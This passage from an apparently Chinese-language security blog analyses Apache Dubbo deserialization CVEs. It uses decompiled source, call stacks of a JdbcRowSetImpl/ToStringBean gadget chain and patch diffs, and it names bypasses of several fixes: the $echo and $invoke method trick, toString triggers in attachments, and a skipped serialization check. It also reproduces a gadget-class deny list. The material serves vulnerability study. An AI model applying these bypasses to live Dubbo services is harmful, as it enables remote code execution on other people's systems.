        long id = Bytes.bytes2long(header, 4);
        ObjectInput in;
        if ((flag &amp; -128) == 0) &#123;
            ...
        &#125;
        &#125; else &#123;
            Request req = new Request(id);
            req.setVersion(Version.getProtocolVersion());
            req.setTwoWay((flag &amp; 64) != 0);
            if ((flag &amp; 32) != 0) &#123;
                req.setEvent(true);
            &#125;

            try &#123;
                Object data;
                if (req.isEvent()) &#123;//2.7.6
                    in = CodecSupport.deserialize(channel.getUrl(), is, proto);
                    data = this.decodeEventData(channel, in);
                &#125; else &#123;
                    DecodeableRpcInvocation inv;
                    if (channel.getUrl().getParameter(&quot;decode.in.io&quot;, false)) &#123;
                        inv = new DecodeableRpcInvocation(channel, req, is, proto);
                        inv.decode();//2.7.3
</code></pre>
<h5 id="sink3-bypass3"><a href="#sink3-bypass3" class="headerlink" title="sink3 //bypass3"></a><strong>sink</strong>3 //bypass3</h5><p>com.alibaba.com.caucho.hessian.io.MapDeserializer</p>
<pre><code class="java">    protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123;
        Deserializer keyDeserializer = null;
        Deserializer valueDeserializer = null;
        SerializerFactory factory = this.findSerializerFactory(in);
        if (keyType != null) &#123;
            keyDeserializer = factory.getDeserializer(keyType.getName());
        &#125;

        if (valueType != null) &#123;
            valueDeserializer = factory.getDeserializer(valueType.getName());
        &#125;

        while(!in.isEnd()) &#123;
            map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject());
        &#125;
</code></pre>
<p>调用链</p>
<pre><code>doReadMap:134, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readObject:2703, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2278, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2080, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2074, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:92, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
decode:139, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:79, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)
</code></pre><p>hashmap.put(key,value)-&gt;key.toString()//java反序列化gadgets</p>
<h5 id="绕过补丁-bypass5"><a href="#绕过补丁-bypass5" class="headerlink" title="绕过补丁//bypass5"></a>绕过补丁//bypass5</h5><p>原有sink，但是构造错误的序列化字符串，绕过清除</p>
<pre><code>getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
toString:158, ToStringBean (com.rometools.rome.feed.impl)
toString:129, ToStringBean (com.rometools.rome.feed.impl)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
toString:559, AbstractMap (java.util)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
toString:429, RpcInvocation (org.apache.dubbo.rpc)
safeToString:63, Request (org.apache.dubbo.remoting.exchange)
toString:133, Request (org.apache.dubbo.remoting.exchange)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
run:59, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:748, Thread (java.lang)
</code></pre><h5 id="sink1-但是attachments"><a href="#sink1-但是attachments" class="headerlink" title="sink1//但是attachments"></a>sink1//但是attachments</h5><blockquote>
<p>只清空 arguments</p>
</blockquote>
<pre><code>    public Object decode(Channel channel, InputStream input) throws IOException &#123;
        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
        this.put(&quot;serialization_id&quot;, this.serializationType);
        String dubboVersion = in.readUTF();
        this.request.setVersion(dubboVersion);
        this.setAttachment(&quot;dubbo&quot;, dubboVersion);
        String path = in.readUTF();
        this.setAttachment(&quot;path&quot;, path);
        String version = in.readUTF();
        this.setAttachment(&quot;version&quot;, version);
        this.setMethodName(in.readUTF());
        String desc = in.readUTF();
        this.setParameterTypesDesc(desc);

        try &#123;
            if (ConfigurationUtils.getSystemConfiguration().getBoolean(&quot;serialization.security.check&quot;, false)) &#123;
                CodecSupport.checkSerialization(path, version, this.serializationType);
            &#125;

            Object[] args = DubboCodec.EMPTY_OBJECT_ARRAY;
            Class&lt;?&gt;[] pts = DubboCodec.EMPTY_CLASS_ARRAY;
            if (desc.length() &gt; 0) &#123;
                ServiceRepository repository = ApplicationModel.getServiceRepository();
                ServiceDescriptor serviceDescriptor = repository.lookupService(path);
                if (serviceDescriptor != null) &#123;
                    MethodDescriptor methodDescriptor = serviceDescriptor.getMethod(this.getMethodName(), desc);
                    if (methodDescriptor != null) &#123;
                        pts = methodDescriptor.getParameterClasses();
                        this.setReturnTypes(methodDescriptor.getReturnTypes());
                    &#125;
                &#125;

                if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;
                    if (!RpcUtils.isGenericCall(desc, this.getMethodName()) &amp;&amp; !RpcUtils.isEcho(desc, this.getMethodName())) &#123;
                        throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + this.getMethodName());
                    &#125;

                    pts = ReflectUtils.desc2classArray(desc);
                &#125;

                args = new Object[pts.length];

                for(int i = 0; i &lt; args.length; ++i) &#123;
                    try &#123;
                        args[i] = in.readObject(pts[i]);
                    &#125; catch (Exception var18) &#123;
                        if (log.isWarnEnabled()) &#123;
                            log.warn(&quot;Decode argument failed: &quot; + var18.getMessage(), var18);
                        &#125;
                    &#125;
                &#125;
            &#125;

            this.setParameterTypes(pts);
            Map&lt;String, Object&gt; map = in.readAttachments();//bypass3//触发hashmap的put
            if (map != null &amp;&amp; map.size() &gt; 0) &#123;
                Map&lt;String, Object&gt; attachment = this.getObjectAttachments();
                if (attachment == null) &#123;
                    attachment = new HashMap();
                &#125;

                ((Map)attachment).putAll(map);
                this.setObjectAttachments((Map)attachment);//设置attachment//后续触发toString
            &#125;
</code></pre><p>calc1</p>
<pre><code>toString:442, RpcInvocation (org.apache.dubbo.rpc)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
getInvoker:267, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)
decodeInvocationArgument:292, CallbackServiceCodec (org.apache.dubbo.rpc.protocol.dubbo)
decode:177, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
run:748, Thread (java.lang)
</code></pre><p>calc2</p>
<pre><code>toString:442, RpcInvocation (org.apache.dubbo.rpc)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
getInvoker:267, DubboProtocol (org.apache.dubbo.rpc.protocol.dubbo)
reply:123, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
received:155, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
run:748, Thread (java.lang)
</code></pre><p>calc3</p>
<pre><code>toString:443, RpcInvocation (org.apache.dubbo.rpc)
safeToString:63, Request (org.apache.dubbo.remoting.exchange)
toString:143, Request (org.apache.dubbo.remoting.exchange)
valueOf:2994, String (java.lang)
append:131, StringBuilder (java.lang)
run:59, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
run:748, Thread (java.lang)
</code></pre><h3 id="2-7-7绕过"><a href="#2-7-7绕过" class="headerlink" title="2.7.7绕过"></a>2.7.7绕过</h3><p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/pull/6374">https://github.com/apache/dubbo/pull/6374</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7</a></p>
<p>DecodeableRpcInvocation</p>
<p><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0">https://github.com/apache/dubbo/compare/dubbo-2.7.6...dubbo-2.7.7#diff-a32630b1035c586f6eae2d778e19fc172e986bb0be1d4bc642f8ee79df48ade0</a></p>
<pre><code class="java">                if (pts == DubboCodec.EMPTY_CLASS_ARRAY) &#123;
                    if (!RpcUtils.isGenericCall(path, this.getMethodName()) &amp;&amp; !RpcUtils.isEcho(path, this.getMethodName())) &#123;
                        throw new IllegalArgumentException(&quot;Service not found:&quot; + path + &quot;, &quot; + this.getMethodName());//2.7.6报错退出
                    &#125;

                    pts = ReflectUtils.desc2classArray(desc);
                &#125;
</code></pre>
<p>RpcUtils</p>
<pre><code>    public static boolean isGenericCall(String path, String method) &#123;
        return &quot;$invoke&quot;.equals(method) || &quot;$invokeAsync&quot;.equals(method);
    &#125;
    public static boolean isEcho(String path, String method) &#123;
        return &quot;$echo&quot;.equals(method);
    &#125;
</code></pre><p>改method即可绕过</p>
<h3 id="2-7-9"><a href="#2-7-9" class="headerlink" title="2.7.9"></a>2.7.9</h3><p>2.7.8</p>
<pre><code>    protected Object decodeEventData(Channel channel, ObjectInput in) throws IOException &#123;
        try &#123;
            return in.readEvent();
        &#125; catch (ClassNotFoundException | IOException var4) &#123;
            throw new IOException(StringUtils.toString(&quot;Decode dubbo protocol event failed.&quot;, var4));
        &#125;
    &#125;
</code></pre><p>2.7.9</p>
<pre><code>    protected Object decodeEventData(Channel channel, ObjectInput in, byte[] eventBytes) throws IOException &#123;
        try &#123;
            if (eventBytes != null) &#123;
                int dataLen = eventBytes.length;
                int threshold = ConfigurationUtils.getSystemConfiguration().getInt(&quot;deserialization.event.size&quot;, 50);
                if (dataLen &gt; threshold) &#123;
                    throw new IllegalArgumentException(&quot;Event data too long, actual size &quot; + dataLen + &quot;, threshold &quot; + threshold + &quot; rejected for security consideration.&quot;);
                &#125;
            &#125;

            return in.readEvent();
        &#125; catch (ClassNotFoundException | IOException var6) &#123;
            throw new IOException(StringUtils.toString(&quot;Decode dubbo protocol event failed.&quot;, var6));
        &#125;
    &#125;
</code></pre><h3 id="2-7-13黑名单未启用"><a href="#2-7-13黑名单未启用" class="headerlink" title="2.7.13黑名单未启用"></a>2.7.13黑名单未启用</h3><p>bypass3</p>
<pre><code>doReadMap:145, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readMap:126, MapDeserializer (com.alibaba.com.caucho.hessian.io)
readObject:2123, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:2104, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readObject:102, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)

readAttachments:87, ObjectInput (org.apache.dubbo.common.serialize)
decode:165, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
run:748, Thread (java.lang)
</code></pre><p>bypass4</p>
<pre><code>expect:3566, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readString:1883, Hessian2Input (com.alibaba.com.caucho.hessian.io)
readUTF:90, Hessian2ObjectInput (org.apache.dubbo.common.serialize.hessian2)
decode:122, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:83, DecodeableRpcInvocation (org.apache.dubbo.rpc.protocol.dubbo)
decode:57, DecodeHandler (org.apache.dubbo.remoting.transport)
received:44, DecodeHandler (org.apache.dubbo.remoting.transport)
run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
run:41, InternalRunnable (org.apache.dubbo.common.threadlocal)
run:748, Thread (java.lang)
</code></pre><h3 id="2-7-14使用黑名单"><a href="#2-7-14使用黑名单" class="headerlink" title="2.7.14使用黑名单"></a>2.7.14使用黑名单</h3><p>bypass4 报错</p>
<pre><code>三月 16, 2022 9:56:18 下午 com.alibaba.com.caucho.hessian.io.ClassFactory load
严重: com.rometools.rome.feed.impl.ToStringBean in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.
三月 16, 2022 9:56:18 下午 com.alibaba.com.caucho.hessian.io.ClassFactory load
严重: com.sun.rowset.JdbcRowSetImpl in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.
[16/03/22 09:56:20:020 CST] DubboServerHandler-169.254.59.59:20880-thread-2  WARN dubbo.DecodeableRpcInvocation:  [DUBBO] Decode rpc invocation failed: expected string at 0x48 java.util.HashMap (&#123;pwn=&#123;beanClass=class com.sun.rowset.JdbcRowSetImpl, 
at com.alibaba.com.caucho.hessian.io.Hessian2Input.error(Hessian2Input.java:3590)
</code></pre><p>com.alibaba.com.caucho.hessian.io.ClassFactory</p>
<p>2.7.13</p>
<pre><code class="java">    public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123;
        if (this.isAllow(className)) &#123;
            return Class.forName(className, false, this._loader);
        &#125; else &#123;
            log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization  with type &#39;HashMap&#39; instead.&quot;);
            return HashMap.class;
        &#125;
    &#125;
    private void initAllow() &#123;
        synchronized(this) &#123;
            if (this._allowList == null) &#123;
                this._allowList = new ArrayList();
                this._allowList.addAll(_staticAllowList);//添加_allowList//但是没有直接或间接调用initAllow
            &#125;
        &#125;
    &#125;
    private boolean isAllow(String className) &#123;
        ArrayList&lt;ClassFactory.Allow&gt; allowList = this._allowList;//默认null，没有做限制
        if (allowList == null) &#123;
            return true;
</code></pre>
<p>2.7.14</p>
<pre><code class="java">    static &#123;
        ClassLoader classLoader = ClassFactory.class.getClassLoader();

        try &#123;
            String[] denyClasses = readLines(classLoader.getResourceAsStream(&quot;DENY_CLASS&quot;));
            String[] var2 = denyClasses;
            int var3 = denyClasses.length;

            for(int var4 = 0; var4 &lt; var3; ++var4) &#123;
                String denyClass = var2[var4];
                if (!denyClass.startsWith(&quot;#&quot;)) &#123;
                    if (denyClass.endsWith(&quot;.&quot;)) &#123;
                        _staticAllowList.add(new ClassFactory.AllowPrefix(denyClass, false));
                    &#125; else &#123;
                        _staticAllowList.add(new ClassFactory.Allow(toPattern(denyClass), false));
                    &#125;
                &#125;
            &#125;
        &#125; catch (IOException var6) &#123;
        &#125;
    &#125;

    ClassFactory(ClassLoader loader) &#123;
        this._loader = loader;
        this.initAllow();//直接调用initAllow//初始化_allowList
    &#125;

    public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123;
        if (this.isAllow(className)) &#123;
            Class&lt;?&gt; aClass = Class.forName(className, false, this._loader);
            if (_allowClassSet.containsKey(className)) &#123;
                return aClass;
            &#125; else &#123;
                Class aSuperClass;
                if (aClass.getInterfaces().length &gt; 0) &#123;
                    Class[] var3 = aClass.getInterfaces();
                    int var4 = var3.length;

                    for(int var5 = 0; var5 &lt; var4; ++var5) &#123;
                        aSuperClass = var3[var5];
                        if (!this.isAllow(aSuperClass.getName())) &#123;
                            log.log(Level.SEVERE, className + &quot;&#39;s interfaces: &quot; + aSuperClass.getName() + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;);
                            return HashMap.class;
                        &#125;
                    &#125;
                &#125;

                List&lt;Class&lt;?&gt;&gt; allSuperClasses = new LinkedList();

                for(Class superClass = aClass.getSuperclass(); superClass != null; superClass = superClass.getSuperclass()) &#123;
                    allSuperClasses.add(superClass);
                &#125;

                Iterator var9 = allSuperClasses.iterator();

                do &#123;
                    if (!var9.hasNext()) &#123;
                        _allowClassSet.put(className, className);
                        return aClass;
                    &#125;

                    aSuperClass = (Class)var9.next();
                &#125; while(this.isAllow(aSuperClass.getName()));

                log.log(Level.SEVERE, className + &quot;&#39;s superClass: &quot; + aSuperClass.getName() + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;);
                return HashMap.class;
            &#125;
        &#125; else &#123;
            log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization with type &#39;HashMap&#39; instead.&quot;);
            return HashMap.class;//白名单外，返回 HashMap.class
        &#125;
    &#125;
</code></pre>
<p>dubbo-2.7.14.jar/DENY_CLASS</p>
<pre><code>bsh.
ch.qos.logback.core.db.
clojure.
com.alibaba.citrus.springext.support.parser.
com.alibaba.citrus.springext.util.SpringExtUtil.
com.alibaba.druid.pool.
com.alibaba.hotcode.internal.org.apache.commons.collections.functors.
com.alipay.custrelation.service.model.redress.
com.alipay.oceanbase.obproxy.druid.pool.
com.caucho.config.types.
com.caucho.hessian.test.
com.caucho.naming.
com.ibm.jtc.jax.xml.bind.v2.runtime.unmarshaller.
com.ibm.xltxe.rnm1.xtq.bcel.util.
com.mchange.v2.c3p0.
com.mysql.jdbc.util.
com.rometools.rome.feed.
com.sun.corba.se.impl.
com.sun.corba.se.spi.orbutil.
com.sun.jndi.rmi.
com.sun.jndi.toolkit.
com.sun.org.apache.bcel.internal.
com.sun.org.apache.xalan.internal.
com.sun.rowset.
com.sun.xml.internal.bind.v2.
com.taobao.vipserver.commons.collections.functors.
groovy.lang.
java.beans.
java.lang.ProcessBuilder
java.lang.Runtime
java.rmi.server.
java.security.
java.util.ServiceLoader
javassist.bytecode.annotation.
javassist.tools.web.Viewer
javassist.util.proxy.
javax.imageio.
javax.imageio.spi.
javax.management.
javax.media.jai.remote.
javax.naming.
javax.script.
javax.sound.sampled.
javax.xml.transform.
net.bytebuddy.dynamic.loading.
oracle.jdbc.connector.
oracle.jdbc.pool.
org.apache.aries.transaction.jms.
org.apache.bcel.util.
org.apache.carbondata.core.scan.expression.
org.apache.commons.beanutils.
org.apache.commons.codec.binary.
org.apache.commons.collections.functors.
org.apache.commons.collections4.functors.
org.apache.commons.configuration.
org.apache.commons.configuration2.
org.apache.commons.dbcp.datasources.
org.apache.commons.dbcp2.datasources.
org.apache.commons.fileupload.disk.
org.apache.ibatis.executor.loader.
org.apache.ibatis.javassist.bytecode.
org.apache.ibatis.javassist.tools.
org.apache.ibatis.javassist.util.
org.apache.ignite.cache.
org.apache.log.output.db.
org.apache.log4j.receivers.db.
org.apache.myfaces.view.facelets.el.
org.apache.openjpa.ee.
org.apache.openjpa.ee.
org.apache.shiro.
org.apache.tomcat.dbcp.
org.apache.velocity.runtime.
org.apache.velocity.
org.apache.wicket.util.
org.apache.xalan.xsltc.trax.
org.apache.xbean.naming.context.
org.apache.xpath.
org.apache.zookeeper.
org.aspectj.apache.bcel.util.
org.codehaus.groovy.runtime.
org.datanucleus.store.rdbms.datasource.dbcp.datasources.
org.eclipse.jetty.util.log.
org.geotools.filter.
org.h2.value.
org.hibernate.tuple.component.
org.hibernate.type.
org.jboss.ejb3.
org.jboss.proxy.ejb.
org.jboss.resteasy.plugins.server.resourcefactory.
org.jboss.weld.interceptor.builder.
org.mockito.internal.creation.cglib.
org.mortbay.log.
org.quartz.
org.springframework.aop.aspectj.
org.springframework.beans.BeanWrapperImpl$BeanPropertyHandler
org.springframework.beans.factory.
org.springframework.expression.spel.
org.springframework.jndi.
org.springframework.orm.
org.springframework.transaction.
org.yaml.snakeyaml.tokens.
pstore.shaded.org.apache.commons.collections.
sun.rmi.server.
sun.rmi.transport.
weblogic.ejb20.internal.
weblogic.jms.common.
</code></pre><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1945763">https://cloud.tencent.com/developer/article/1945763</a></p>
<h2 id="CVE-2021-25641"><a href="#CVE-2021-25641" class="headerlink" title="CVE-2021-25641"></a>CVE-2021-25641</h2><blockquote>
<p>Apache Dubbo 2.7.0 to 2.7.8</p>
<p>Apache Dubbo 2.6.0 to 2.6.9</p>
<p>Apache Dubbo all 2.5.x versions (官方已不再提供支持)</p>
</blockquote>
<p>fastjson </p>
<p>toString </p>
<h2 id="CVE-2021-30179"><a href="#CVE-2021-30179" class="headerlink" title="CVE-2021-30179"></a>CVE-2021-30179</h2><p><a target="_blank" rel="noopener" href="https://www.modb.pro/db/145553">https://www.modb.pro/db/145553</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2021-30179/">https://www.cvedetails.com/cve/CVE-2021-30179/</a></p>
<blockquote>
<p>Apache Dubbo 2.7.0 to 2.7.9</p>
<p>Apache Dubbo 2.6.0 to 2.6.9</p>
<p>Apache Dubbo all 2.5.x versions (官方已不再提供支持)</p>
</blockquote>
<p><strong>2.7.9</strong></p>
<p>RpcUtils</p>
<pre><code>    public static boolean isGenericCall(String parameterTypesDesc, String method) &#123;
        return (&quot;$invoke&quot;.equals(method) || &quot;$invokeAsync&quot;.equals(method)) &amp;&amp; &quot;Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;&quot;.equals(parameterTypesDesc);
    &#125;

    public static boolean isEcho(String parameterTypesDesc, String method) &#123;
        return &quot;$echo&quot;.equals(method) &amp;&amp; &quot;Ljava/lang/Object;&quot;.equals(parameterTypesDesc);
    &#125;
</code></pre><p>类型为数组Ljava/lang/Object;</p>
<p>使用$echo</p>
<h2 id="CVE-2021-36161"><a href="#CVE-2021-36161" class="headerlink" title="CVE-2021-36161"></a>CVE-2021-36161</h2><p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2021-36161/">https://www.cvedetails.com/cve/CVE-2021-36161/</a></p>
<blockquote>
<p>Dubbo 中的某些组件会尝试打印输入参数的格式化字符串，这可能会导致对带有特殊 toString 方法的恶意定制 bean 的 RCE。在最新版本中，我们修复了超时、缓存和其他一些地方的 toString 调用。Apache Dubbo 2.7.13 修复</p>
</blockquote>
<p>CVE-2021-36163</p>
<h2 id="CVE-2021-37579-source-check绕过"><a href="#CVE-2021-37579-source-check绕过" class="headerlink" title="CVE-2021-37579//source check绕过"></a>CVE-2021-37579//source check绕过</h2><p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2021-37579/">https://www.cvedetails.com/cve/CVE-2021-37579/</a></p>
<blockquote>
<p>&lt;=2.7.12</p>
<p>Dubbo Provider 会检查传入的请求以及该请求对应的序列化类型是否满足服务器设置的配置。但是攻击者可以使用一个例外来跳过安全检查（启用时）并使用本机 java 序列化进行反序列化操作。Apache Dubbo 2.7.13、3.0.2 通过在发现任何无法识别的请求时快速失败来解决此问题。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/">https://securitylab.github.com/advisories/GHSL-2021-097-apache-dubbo/</a></p>
<p><strong>serialization.security.check</strong></p>
<p>需要设置环境变量启动</p>
<pre><code class="java">System.setProperty(&quot;serialization.security.check&quot;, String.valueOf(true));
</code></pre>
<p>DecodeableRpcInvocation</p>
<pre><code class="java">    public Object decode(Channel channel, InputStream input) throws IOException &#123;
        ObjectInput in = CodecSupport.getSerialization(channel.getUrl(), this.serializationType).deserialize(channel.getUrl(), input);
        this.put(&quot;serialization_id&quot;, this.serializationType);
        String dubboVersion = in.readUTF();
        this.request.setVersion(dubboVersion);
        this.setAttachment(&quot;dubbo&quot;, dubboVersion);
        String path = in.readUTF();
        this.setAttachment(&quot;path&quot;, path);
        String version = in.readUTF();
        this.setAttachment(&quot;version&quot;, version);
        this.setMethodName(in.readUTF());
        String desc = in.readUTF();
        this.setParameterTypesDesc(desc);

        try &#123;
            if (ConfigurationUtils.getSystemConfiguration().getBoolean(&quot;serialization.security.check&quot;, false)) &#123;
                CodecSupport.checkSerialization(path, version, this.serializationType);
            &#125;
</code></pre>
<p>2.7.12</p>
<blockquote>
<p>传递一个不存在的合法参数，这将使调用结束且不会引发异常</p>
</blockquote>
<pre><code class="java">    public static void checkSerialization(String path, String version, Byte id) throws IOException &#123;
        ServiceRepository repository = ApplicationModel.getServiceRepository();
        ProviderModel providerModel = repository.lookupExportedServiceWithoutGroup(path + &quot;:&quot; + version);
        if (providerModel == null) &#123;
            if (logger.isWarnEnabled()) &#123;
                logger.warn(&quot;Serialization security check is enabled but cannot work as expected because there&#39;s no matched provider model for path &quot; + path + &quot;, version &quot; + version);
            &#125;
        &#125; else &#123;
            List&lt;URL&gt; urls = providerModel.getServiceConfig().getExportedUrls();
            if (CollectionUtils.isNotEmpty(urls)) &#123;
                URL url = (URL)urls.get(0);
                String serializationName = url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;);
                Byte localId = (Byte)SERIALIZATIONNAME_ID_MAP.get(serializationName);
                if (localId != null &amp;&amp; !localId.equals(id)) &#123;
                    throw new IOException(&quot;Unexpected serialization id:&quot; + id + &quot; received from network, please check if the peer send the right id.&quot;);
                &#125;
            &#125;
        &#125;
    &#125;
</code></pre>
<p>2.7.13补丁//log改成throw Exception</p>
<pre><code class="java">    public static void checkSerialization(String path, String version, Byte id) throws IOException &#123;
        ServiceRepository repository = ApplicationModel.getServiceRepository();
        ProviderModel providerModel = repository.lookupExportedServiceWithoutGroup(path + &quot;:&quot; + version);
        if (providerModel == null) &#123;
            throw new IOException(&quot;Service &quot; + path + &quot; with version &quot; + version + &quot; not found, invocation rejected.&quot;);
        &#125; else &#123;
            List&lt;URL&gt; urls = providerModel.getServiceConfig().getExportedUrls();
            if (CollectionUtils.isNotEmpty(urls)) &#123;
                URL url = (URL)urls.get(0);
                String serializationName = url.getParameter(&quot;serialization&quot;, &quot;hessian2&quot;);
                Byte localId = (Byte)SERIALIZATIONNAME_ID_MAP.get(serializationName);
                if (localId != null &amp;&amp; !localId.equals(id)) &#123;
                    throw new IOException(&quot;Unexpected serialization id:&quot; + id + &quot; received from network, please check if the peer send the right id.&quot;);
                &#125;
            &#125;

        &#125;
    &#125;
</code></pre>
<p><strong>还是黑名单好用，过滤sink不如过滤source</strong></p>
<h2 id="CVE-2021-43297"><a href="#CVE-2021-43297" class="headerlink" title="CVE-2021-43297"></a>CVE-2021-43297</h2><p><a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2021-43297/">https://www.cvedetails.com/cve/CVE-2021-43297/</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1945763">https://cloud.tencent.com/developer/article/1945763</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15828415.html#5-dubbo2713%E5%8F%AF%E7%94%A8%E7%9A%84poc">https://www.cnblogs.com/bitterz/p/15828415.html#5-dubbo2713%E5%8F%AF%E7%94%A8%E7%9A%84poc</a></p>
<blockquote>
<p>dubbo hessian-lite 3.2.11及之前版本存在反序列化漏洞，可能导致恶意代码执行。大多数 Dubbo 用户使用 Hessian2 作为默认的序列化/反序列化协议，在 Hessian 捕获意外异常期间，Hessian 会为用户注销一些信息，这可能会导致远程命令执行。该问题影响 Apache Dubbo Apache Dubbo 2.6.x 2.6.12 之前的版本；Apache Dubbo 2.7.x 2.7.15 之前的版本；Apache Dubbo 3.0.x 3.0.5 之前的版本。</p>
</blockquote>
<blockquote>
<ul>
<li>Apache Dubbo 2.6.x &lt; 2.6.12</li>
<li>Apache Dubbo 2.7.x &lt; 2.7.15</li>
<li>Apache Dubbo 3.0.x &lt; 3.0.5</li>
</ul>
</blockquote>
<p>AbstractDeserializer、AbstractListDeserializer、AbstractMapDeserializer</p>
<p>com.alibaba.com.caucho.hessian.io.AbstractMapDeserializer</p>
<pre><code class="java">    public Object readObject(AbstractHessianInput in) throws IOException &#123;
        Object obj = in.readObject();
        if (obj != null) &#123;
            throw this.error(&quot;expected map/object at &quot; + obj.getClass().getName() + &quot; (&quot; + obj + &quot;)&quot;);
        &#125; else &#123;
            throw this.error(&quot;expected map/object at null&quot;);
        &#125;
    &#125;
</code></pre>
<p>2.7.13没有黑名单</p>
<p>2.7.14需要绕过黑名单</p>
